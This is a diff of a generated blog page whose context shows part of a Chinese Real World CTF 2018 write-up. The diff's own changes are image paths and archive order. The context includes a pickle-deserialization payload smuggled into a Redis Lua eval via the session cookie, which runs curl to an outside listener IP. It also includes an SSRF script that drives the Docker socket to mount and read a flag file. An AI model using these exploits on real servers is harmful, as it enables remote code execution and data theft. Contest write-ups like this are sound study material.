@@ -433,10 +433,10 @@
 <p>发现该服务运行于debug模式下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@login_required</span><br><span class="line">@user_blueprint.route(&apos;/admin/system/refresh_session/&apos;, methods=[&apos;POST&apos;])</span><br><span class="line">def refresh_session():</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">        delete all session except the logined user</span><br><span class="line"></span><br><span class="line">        :return: json</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        status = &apos;success&apos;</span><br><span class="line">        sessionid = flask.session.sid</span><br><span class="line">        prefix = app.config[&apos;SESSION_KEY_PREFIX&apos;]</span><br><span class="line"></span><br><span class="line">        if flask.request.form.get(&apos;submit&apos;, None) == &apos;1&apos;:</span><br><span class="line">            try:</span><br><span class="line">                rds.eval(rf&apos;&apos;&apos;</span><br><span class="line">                local function has_value (tab, val)</span><br><span class="line">                    for index, value in ipairs(tab) do</span><br><span class="line">                        if value == val then</span><br><span class="line">                            return true</span><br><span class="line">                        end</span><br><span class="line">                    end</span><br><span class="line">                </span><br><span class="line">                    return false</span><br><span class="line">                end</span><br><span class="line">                </span><br><span class="line">                local inputs = &#123;&#123; &quot;&#123;prefix&#125;&#123;sessionid&#125;&quot; &#125;&#125;</span><br><span class="line">                local sessions = redis.call(&quot;keys&quot;, &quot;&#123;prefix&#125;*&quot;)</span><br><span class="line">                </span><br><span class="line">                for index, sid in ipairs(sessions) do</span><br><span class="line">                    if not has_value(inputs, sid) then</span><br><span class="line">                        redis.call(&quot;del&quot;, sid)</span><br><span class="line">                    end</span><br><span class="line">                end</span><br><span class="line">                &apos;&apos;&apos;, 0)</span><br><span class="line">            except redis.exceptions.ResponseError as e:</span><br><span class="line">                app.logger.exception(e)</span><br><span class="line">                status = &apos;fail&apos;</span><br><span class="line"></span><br><span class="line">        return flask.jsonify(dict(status=status))</span><br></pre></td></tr></table></figure>
 <p>上边这一段代码由于<code>@login_required</code> 写在route上边，所以存在未授权访问。</p>
-<p><img src="/posts/13474/assets/realworldctf/TIM截图20180801194537.png" alt=""></p>
+<p><img src="/assets/realworldctf/TIM截图20180801194537.png" alt=""></p>
 </li>
 <li><p>添加csrf_token</p>
-<p><img src="/posts/13474/assets/realworldctf/TIM截图20180801195906.png" alt=""></p>
+<p><img src="/assets/realworldctf/TIM截图20180801195906.png" alt=""></p>
 </li>
 <li><p>漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local inputs = &#123;&#123; &quot;&#123;prefix&#125;&#123;sessionid&#125;&quot; &#125;&#125;</span><br><span class="line">local sessions = redis.call(&quot;keys&quot;, &quot;&#123;prefix&#125;*&quot;)</span><br></pre></td></tr></table></figure>
@@ -461,7 +461,7 @@
 <li><p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import cPickle</span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">DEBUG = 0</span><br><span class="line"></span><br><span class="line">URL = &quot;http://18.213.16.123:5000/&quot; if not DEBUG else &quot;http://127.0.0.1:5000/&quot;</span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        listen_ip = &quot;123.207.90.143&quot;</span><br><span class="line">        listen_port = 1234</span><br><span class="line">        s = &quot;&quot;&quot;curl 123.207.90.143:1234&quot;&quot;&quot;</span><br><span class="line">        return (os.system,(s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line">s_bypass = &quot;&quot;</span><br><span class="line">for i in s:</span><br><span class="line">    s_bypass +=&quot;string.char(%s)..&quot;%ord(i)</span><br><span class="line">evilcode = &apos;&apos;&apos;redis.call(&quot;set&quot;,&quot;bookhub:session:tianji&quot;,%s)&apos;&apos;&apos;%s_bypass[:-2]</span><br><span class="line">payload = &apos;&apos;&apos;2047a141-2493-4f81-b315-8b8d95d3db33&quot;,%s,&quot;bookhub:session:tianji&apos;&apos;&apos;%evilcode</span><br><span class="line">payload = payload.replace(&quot; &quot;,&quot;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &apos;bookhub-session=%s&apos; % payload,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">        &apos;X-CSRFToken&apos;: &apos;&apos;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    print headers[&quot;Cookie&quot;]</span><br><span class="line"></span><br><span class="line">    res = requests.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class="line">    if res.status_code == 200:</span><br><span class="line">        html = res.content</span><br><span class="line">        r = re.findall(r&apos;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&apos;, html)</span><br><span class="line">        if r:</span><br><span class="line">            headers[&apos;X-CSRFToken&apos;] = r[0]</span><br><span class="line">            # refresh_session</span><br><span class="line">            data = &#123;&apos;submit&apos;: &apos;1&apos;&#125;</span><br><span class="line">            res = requests.post(URL + &apos;admin/system/refresh_session/&apos;,</span><br><span class="line">                           data=data, headers=headers)</span><br><span class="line">            if res.status_code == 200:</span><br><span class="line">                print(res.content)</span><br><span class="line">            else:</span><br><span class="line">                print(res.content)</span><br><span class="line">            # fuck</span><br><span class="line">            headers[&apos;Cookie&apos;] = &apos;bookhub-session=tianji&apos;</span><br><span class="line">            res = requests.get(URL + &apos;login/&apos;, headers=headers)</span><br><span class="line">            if res.status_code == 200:</span><br><span class="line">                print(res.content)</span><br><span class="line">            else:</span><br><span class="line">                print(res.content)</span><br></pre></td></tr></table></figure>
 <p>收到响应。</p>
-<p><img src="/posts/13474/assets/realworldctf/TIM截图20180802110118.png" alt=""></p>
+<p><img src="/assets/realworldctf/TIM截图20180802110118.png" alt=""></p>
 </li>
 <li><p>修改payload，获取flag</p>
 <p>payload1:</p>
@@ -489,12 +489,12 @@
 </li>
 <li><p>漏洞利用</p>
 <p><strong>axios</strong>这个东西是不支持<strong>file://</strong>协议的，但是通过文档可知，他支持<strong>UNIX Socket</strong> 。</p>
-<p><img src="/posts/13474/assets/realworldctf/TIM截图20180802194917.png" alt=""></p>
+<p><img src="/assets/realworldctf/TIM截图20180802194917.png" alt=""></p>
 <p>测试<code>ping</code>。</p>
 <blockquote>
 <p>GET <a href="http://54.183.55.10/print?url[url]=/_ping&amp;url[socketPath]=/var/run/docker.sock&amp;url=https://hackmd.io/" rel="external nofollow" target="_blank">http://54.183.55.10/print?url[url]=/_ping&amp;url[socketPath]=/var/run/docker.sock&amp;url=https://hackmd.io/</a> HTTP/1.1</p>
 </blockquote>
-<p><img src="/posts/13474/assets/realworldctf/TIM截图20180802195456.png" alt=""></p>
+<p><img src="/assets/realworldctf/TIM截图20180802195456.png" alt=""></p>
 </li>
 <li><p>exploit.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote <span class="keyword">as</span> urlencode</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://54.183.55.10/print?&#123;url&#125;&amp;url=https%3A%2F%2Fhackmd.io%2Fvbz2j6hkR9CIgABjEbRrzQ"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(u)</span>:</span></span><br><span class="line">    res = req.get(u, timeout=<span class="number">10</span>, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(res.content, <span class="string">"lxml"</span>)</span><br><span class="line">        body = soup.select(<span class="string">".markdown-body"</span>)</span><br><span class="line">        <span class="keyword">if</span> body:</span><br><span class="line">            print(body[<span class="number">0</span>].text)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    print(<span class="string">"[-] error"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(_u)</span>:</span></span><br><span class="line">    _u += <span class="string">'&amp;url[socketPath]=/var/run/docker.sock'</span></span><br><span class="line">    pl = URL.format(url=_u)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        get(pl)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    container_name = <span class="string">''</span>.join(random.sample(</span><br><span class="line">        string.ascii_letters + string.digits, <span class="number">6</span>))</span><br><span class="line">    _us = [</span><br><span class="line">        <span class="string">'url[url]=/_ping&amp;'</span>,</span><br><span class="line">        <span class="string">'url[method]=post&amp;url[url]=http://127.0.0.1/assets/create?fromImage=alpine:latest'</span>,</span><br><span class="line">        <span class="string">'url[method]=post&amp;url[url]=http://127.0.0.1/containers/create?name=%s&amp;url[data][Image]=alpine:latest&amp;url[data][Volumes][flag][path]=/getflag&amp;url[data][Binds][]=/flag:/getflag:ro&amp;url[data][Entrypoint][]=/bin/ls'</span> % container_name,</span><br><span class="line">        <span class="string">'url[method]=post&amp;url[url]=http://127.0.0.1/containers/%s/start'</span> % container_name,</span><br><span class="line">        <span class="string">'url[method]=get&amp;url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag'</span> % container_name</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _us:</span><br><span class="line">        fuck(i)</span><br></pre></td></tr></table></figure>
@@ -1517,6 +1517,138 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 56
@@ -1580,12 +1712,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
@@ -1615,12 +1747,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1745,12 +1877,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
@@ -1824,13 +1956,13 @@
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
-    
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
-        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
